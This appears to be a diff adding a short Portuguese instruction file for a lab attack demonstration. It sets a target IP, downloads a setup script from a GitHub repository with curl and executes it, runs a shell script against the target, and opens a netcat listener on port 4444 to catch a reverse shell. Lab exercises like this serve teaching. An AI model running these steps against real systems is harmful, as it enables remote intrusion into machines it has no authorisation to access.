@@ -1,0 +1,13 @@
+# Verifique o IP da máquina a ser atacada criada no lab e salve seu IP em uma variável. Por exemplo:
+IP=192.168.127.10 
+
+# Baixa tudo de uma vez:
+curl -sO https://raw.githubusercontent.com/erick-graeff/demonstracao-ataque/refs/heads/main/setup_kali.sh
+chmod +x setup_kali.sh
+./setup_kali.sh
+
+# Roda em um terminal:
+./run_shell.sh $IP
+
+# Roda em outro:
+nc -lvnp 4444
